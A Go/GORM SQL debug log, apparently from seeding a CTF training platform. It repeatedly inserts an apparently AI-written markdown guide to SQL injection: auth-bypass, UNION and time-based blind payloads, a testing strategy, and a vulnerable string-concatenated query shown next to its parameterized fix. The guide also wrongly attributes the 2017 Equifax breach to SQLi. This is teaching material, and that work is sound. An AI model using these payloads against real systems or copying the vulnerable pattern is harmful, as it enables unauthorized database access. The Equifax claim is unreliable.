SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,66) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.568ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[12.621ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.953','2025-06-09 14:07:54.953',NULL,'cyber security and ybtbw','CmmYrGwDrheQfSLwVJcrKFUBNGDBrLoCpWwxavwEZKWycavGdioMqPfiJgQlEXdMPDdZbPcbTHSYbUgEhXBikRkmZINrGBBWvZkD',100,2) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.459ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.457ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 67 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[22.051ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.965','2025-06-09 14:07:54.965',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,67) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.527ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[11.335ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.991','2025-06-09 14:07:54.991',NULL,'cyber security and hystu','edZKNcSxzzotszMLFGQUuWwjYqrpWoGbBOVhdZYwOaxwXNaSeZvBRvIwhkzIQoXEWruASFhNuHBzeAKCVeQfwhVcZkvWwaybTsaI',100,2) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.529ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.504ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 68 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[10.725ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.999','2025-06-09 14:07:54.999',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,68) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.477ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[7.299ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.009','2025-06-09 14:07:55.009',NULL,'cyber security and recaq','zVsZZdkvjGkhIGSnZYnRXXtNeGXuhEuXpTTquFFRESvOyDQYVjDOqJaZHEkDeZeTvZhrhbBcIqJKdMyyndbvNjjrthLQezSlRnZG',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.557ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.541ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 69 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[8.287ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.017','2025-06-09 14:07:55.017',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,69) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.477ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[7.465ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.025','2025-06-09 14:07:55.025',NULL,'cyber security and qoyot','cDzjRswgaGIwvZWYpGvCQSFPiUASaStQhzABjKIWeKFUyHoaEmbJZYEJAmoNahGNVPRorkDFlIUBjnIuhTHQTmBZCjbUYfvOxBgO',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.463ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.549ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 70 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[11.628ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.033','2025-06-09 14:07:55.033',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

